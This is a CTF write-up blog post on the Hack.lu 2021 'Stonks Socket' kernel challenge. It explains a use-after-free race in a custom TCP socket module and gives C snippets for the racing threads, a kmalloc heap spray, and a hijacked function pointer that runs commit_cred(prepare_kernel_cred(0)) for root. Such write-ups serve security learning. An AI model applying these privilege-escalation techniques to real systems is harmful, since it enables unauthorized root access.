---
layout: post
title:  "Hack.lu 2021 Stonks Socket"
date:   2021-10-31 00:00:00 +0000
categories: jekyll update
---

Last weekend [we](https://r3kapig.com/) played Hack.lu CTF and got 5th place. I am quite busy recently so I only solved one challenge: Stonks Socket, and I think it is quite interesting and worthy to do a writeup.

## 0x00 Overview

In this challenge we need to exploit Linux kernel. In the kernel module, `tcp_prot.ioctl` of TCP socket is written to self-defined function `stonks_ioctl`, and `sk_prot->recvmsg` of TCP socket is written to self-defined function `stonks_rocket` inside one of the handlers in `stonks_ioctl`. The vulnerability is a use-after-free caused by race condition: `sk_user_data` field of `struct sock` is fetched before blocking in `stonks_rocket` and can be freed while blocking, and one of its function pointer field will be called after blocking. Therefore, we perform heap spray to control its function pointer field so to control `rip` in kernel mode. Since SMEP is not enabled, we can execute shellcode in user-space memory to call `commit_cred(prepare_kernel_cred(0))` and get root privilege.

## 0x01 Vulnerabilities

There are actually 3 vulnerabilities in this challenge, but I found other 2 not useful for exploitation:

1. The first vulnerability is the one I mentioned in overview section. Inside `stonks_rocket`, `struct StonksSocket *s_sk = sk->sk_user_data;` is executed to fetch user data of `sk`in first few lines, and the function can be blocked by `tcp_recvmsg`. However, while blocking, we can actually free `sk->sk_user_data` through `OPTION_PUT` command in `stonks_ioctl` using another thread. Therefore, after resuming from `tcp_recvmsg`, `s_sk` is already a freed dangling pointer but `s_sk->hash_function` will be called. Thus, this is an UAF bug.
2. The second vulnerability is an out-of-bound read in command `OPTION_DEBUG`, which allows us to leak arbitrary kernel data. However, it seems that we don't need such data leakage.
3. The third vulnerability is a stack overflow in `secure_hash`. Since `h->length` is controllable and not limited, `(&h->word1)[i] = h->key;` in loop body would cause out-of-bound write. However, since we can only write one 64-bit value and cannot skip over the stack canary, this vulnerability is not quite useful either.

## 0x02 Exploitation

### Trigger Kernel Module Functions

To trigger `stonks_ioctl`, we just need to call `ioctl` using `connfd` returned by `accept` function; after calling `ioctl(connfd, OPTION_CALL, &a)` we can trigger `stonks_rocket` via `recv` function using `connfd`.

### Trigger UAF

As briefly mentioned above, we need to firstly call `OPTION_CALL` command of `ioctl` on `connfd`.

```c
arg_t a = {4, 0, 0x13371337, 0};
printf("%d\n", ioctl(connfd, OPTION_CALL, &a));
```

Then we create a thread, immediately followed by a `recv` function called on `connfd` that fetches `sk->sk_user_data` and blocks the main thread. 

```c
pthread_create(&thread, NULL, client_write, &args);
// ...
recv(connfd, buf, sizeof(buf), 0);
```

Inside thread function, `sleep(1)` is called to ensure `recv` function in main thread is blocked first. Then `ioctl(connfd, OPTION_PUT, NULL)` is called to free `sk->sk_user_data`, and some data is sent to server via client file descriptor to resume `recv` function blocked in main thread.

```c
write(args->clientfd, "20192019", 8);
```

### Heap Spray

This is actually the part that got me stuck for longest time. I firstly considered to use [universal heap spraying](https://etenal.me/archives/1336), but `userfaultfd` is not available due to kernel configuration. Then we tried to find a 32-byte kernel object allocated on heap that can allow user to control the last 8 bytes (e.i. function pointer field), and we indeed found [this](https://elixir.bootlin.com/linux/v5.11.22/source/include/uapi/linux/xfrm.h#L92). However, it seems that corresponding protocol is not supported in this kernel build.

Finally, I still decided to use `kmalloc` called in function `secure_hash` shown below.

```c
//load data
while (i) {
    size = h->length * sizeof(u64);
    buf = kmalloc(size, GFP_KERNEL);
    i = copy_from_iter(buf, size, msg); // copy data sent from client to buf
    for (j = 0; j < i; j++) {
        hash[j] ^= buf[j];
    }
    kfree(buf);
}
```

When `h->length` is 4, 32-byte chunk will be allocated and filled with user-controlled data, which is exactly pointed by `sk->sk_user_data`; and even if the chunk is freed, last 8 bytes will still remain to be our own data. Although this seems to be great, when `while` loop breaks, the buffer is filled with all zeros. After some debugging, I realized that `kmalloc` here would clear the memory chunk allocated to zeros. The loop exit condition is `i == 0`, so this means `copy_from_iter` should return `0` for the last time loop body is executed. `copy_from_iter` always returns the number of bytes that is copied to the destination buffer. Combining these two, this means in the last run of the `while` loop, the buffer will be filled with zeros and no input is read into the buffer, so `s_sk->hash_function` is also `NULL`.

Therefore, we need to let main thread call `sk->sk_user_data->hash_function` *at the same time when* `secure_hash` is still executing that `while` loop. This can be done by creating a new thread to run `secure_hash` function. Initially I was spending a lot of time in trying to let `copy_from_iter` block by using the stack overflow (e.i. third bug mentioned above) to tamper `struct iov_iter`. However, this does not work because if we need to trigger the stack overflow, `h->length` is no longer `4` so that size allocated is not 32 bytes, which means we cannot allocate to chunk pointed by `sk->sk_user_data`.

The final approach is to let the `while` loop run many times by sending a large chunk of data, and hope when executing the `while` loop, the function pointer field is called. It turns out the probability of success is not low if parameter is tuned properly. The important thread functions are shown below.

```c
void* spray_32(void* fds_)
{
	intptr_t fds = (intptr_t)fds_;
	int connfd2 = (int)fds;
	int connfd = fds >> 32;
	printf("free %d\n", ioctl(connfd, OPTION_PUT, NULL));
	// we free chunk here after thread creation,
	// because thread creation will consume 32-byte chunk
	while (1)
	{ // `recv` large data to let this thread enter the while loop at secure_hash
		recv(connfd2, a, sizeof(a), 0);
	}
	return NULL;
}

void * client_write(void * args_)
{
	struct th_arg* args = (struct th_arg*)args_;
	sleep(1);

	pthread_t thread2;
	pthread_create(&thread2, NULL, spray_32, \
		(void*)(intptr_t)(args->connfd2 + ((int64_t)args->connfd << 32)));

	// stop this thread for a while before resuming main thread,
	// otherwise main thread will call function pointer field too soon,
	// before while loop at secure_hash is entered in another thread,
	// loop bound is tuned to be 50 so that success rate is quite high
	for (int i = 0; i < 50; ++i)
	{
		sched_yield();
		usleep(1);
	}
	write(args->clientfd, "20192019", 8);
	puts("client_write exits");
	return NULL;
}
```

The large chunk of data is sent before via `send(*clientfd, a, sizeof(a), 0)`, where `a` is initialized to be pointers to our `get_root` function, which obtains kernel address stored on stack and calls `commit_cred(prepare_kernel_cred(0))`.

```c
for (size_t i = 0; i < sizeof(a) / sizeof(uintptr_t); i++)
{
	a[i] = (uintptr_t)get_root;
}
```

One interesting point to note is that `rip` hijacked is sometimes shift of `&get_root` (e.g. `&get_root << 8`). Possible reason is that `recv` does not necessarily stops at alignment of `8`, so that future alignment might be broken.

The full exploit is [here](https://github.com/Mem2019/Mem2019.github.io/blob/master/codes/18-stonks-socket.c).

